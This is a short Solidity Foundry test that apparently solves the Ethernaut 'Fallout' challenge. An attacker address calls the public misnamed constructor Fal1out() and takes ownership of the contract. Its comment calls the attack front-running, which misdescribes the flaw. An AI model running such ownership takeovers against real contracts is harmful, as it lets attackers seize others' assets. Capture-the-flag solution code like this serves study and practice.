// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../Fallout.sol";

contract FalloutTest is Test {
    Fallout fallout;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        fallout = new Fallout();
    }
    function test_Challenge2_Passed() public {
        claimOwnership();
    }
    function claimOwnership() public {
        // after deployer have deploy it, the Attacker will front run the deploy, to claim ownership
        vm.prank(attacker);
        fallout.Fal1out();
        assertEq(fallout.owner(), attacker);
    }
}